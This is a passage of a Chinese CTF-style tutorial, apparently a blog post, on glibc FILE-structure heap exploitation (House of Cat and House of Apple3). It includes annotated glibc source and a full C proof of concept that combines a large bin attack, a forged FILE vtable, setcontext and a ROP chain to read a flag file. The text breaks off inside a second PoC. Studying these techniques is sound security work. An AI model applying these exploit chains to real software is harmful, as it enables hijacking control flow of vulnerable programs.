<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>要想调用到<code>_IO_switch_to_wget_mode</code>，需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p>
<p>然后在<code>_IO_switch_to_wget_mode</code>函数中：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时就会调用<code>_IO_WOVERFLOW(fp)</code>。</p>
<h3 id="利用-IO-wfile-seekoff函数控制程序执行流（House-of-Cat）"><a href="#利用-IO-wfile-seekoff函数控制程序执行流（House-of-Cat）" class="headerlink" title="利用_IO_wfile_seekoff函数控制程序执行流（House of Cat）"></a>利用_IO_wfile_seekoff函数控制程序执行流（House of Cat）</h3><p>对 <code>fp</code> 的设置如下：</p>
<ul>
<li><p><code>_flags</code> 设置为 <code>~0x8</code>，如果不能保证 <code>_lock</code> 指向可读写内存则 <code>_flags |= 0x8000</code>。</p>
</li>
<li><p><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可</p>
</li>
<li><p><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></p>
</li>
<li><p><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code> ，即满足<code>*A &gt; *(A + 8)</code></p>
</li>
<li><p><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></p>
</li>
<li><p><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></p>
</li>
</ul>
<p>函数的调用链如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_seekoff</span><br><span class="line">    _IO_switch_to_wget_mode</span><br><span class="line">        _IO_WOVERFLOW</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：</p>
<p>首先看 <code>_IO_wfile_seekoff</code> 函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF; </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>为了调用 <code>_IO_switch_to_wget_mode</code> 函数，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> 或 <code>(fp)-&gt;_flags &amp; 0x0800 != 0</code> 。</p>
<p>接着看 <code>_IO_switch_to_wget_mode</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时就会调用<code>_IO_WOVERFLOW(fp)</code>。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: stderr -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = libc_base + <span class="number">0x3b87a0</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="type">size_t</span> *payload = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = stderr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_wfile_jumps_addr = libc_base + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x121a90</span>; <span class="comment">// mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x3aaa8</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x23256</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x2d89f</span>;</span><br><span class="line">    <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x3ac69</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake file</span></span><br><span class="line">    large[<span class="number">-2</span>] &amp;= ~<span class="number">0x8</span>; <span class="comment">// _flags &amp;= ~0x8</span></span><br><span class="line">    large[<span class="number">-1</span>] = (<span class="type">size_t</span>) payload;</span><br><span class="line">    large[<span class="number">25</span>] = IO_wfile_jumps_addr + <span class="number">0x10</span>; <span class="comment">// vtable -&gt; _IO_wfile_jumps + 0x10</span></span><br><span class="line">    large[<span class="number">15</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    large[<span class="number">18</span>] = (<span class="type">size_t</span>) unsorted;<span class="comment">// _wide_data</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake _wide_data</span></span><br><span class="line">    unsorted[<span class="number">4</span>] = (<span class="type">size_t</span>) (<span class="number">-1</span>); <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    unsorted[<span class="number">28</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">//_wide_vtable</span></span><br><span class="line">    unsorted[<span class="number">3</span>] = (<span class="type">size_t</span>) magic_gadget;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SigreturnFrame</span></span><br><span class="line">    payload[<span class="number">4</span>] = (<span class="type">size_t</span>) setcontext + <span class="number">53</span>;</span><br><span class="line">    payload[<span class="number">13</span>] = (<span class="type">size_t</span>) buf; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">    payload[<span class="number">14</span>] = <span class="number">0</span>; <span class="comment">// rsi = 0</span></span><br><span class="line">    payload[<span class="number">17</span>] = <span class="number">0x100</span>; <span class="comment">// rdx = 0x100 read 0x100 bytes</span></span><br><span class="line">    payload[<span class="number">20</span>] = (<span class="type">size_t</span>) &amp;payload[<span class="number">31</span>]; <span class="comment">// rsp -&gt; fake stack</span></span><br><span class="line">    payload[<span class="number">21</span>] = ret; <span class="comment">// rip -&gt; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop</span></span><br><span class="line">    payload[<span class="number">31</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">32</span>] = <span class="number">2</span>;</span><br><span class="line">    payload[<span class="number">33</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">34</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">35</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">36</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">37</span>] = <span class="number">3</span>;</span><br><span class="line">    payload[<span class="number">38</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">39</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">40</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">41</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">42</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">43</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">45</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">46</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">47</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __malloc_assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_chunk_addr = unsorted + <span class="number">0x124</span>;</span><br><span class="line">    top_chunk_addr[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="House-of-Apple3"><a href="#House-of-Apple3" class="headerlink" title="House of Apple3"></a>House of Apple3</h2><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体相关定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。</p>
<p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多，以<code>__libio_codecvt_in</code>为例，源码分析如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">            <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"> </span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">            (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">             (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">             &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">       <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中，<code>__gconv_fct</code>和<code>DL_CALL_FCT</code>被定义为：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>



<h3 id="利用-IO-wfile-underflow函数控制程序执行流"><a href="#利用-IO-wfile-underflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow函数控制程序执行流"></a>利用_IO_wfile_underflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 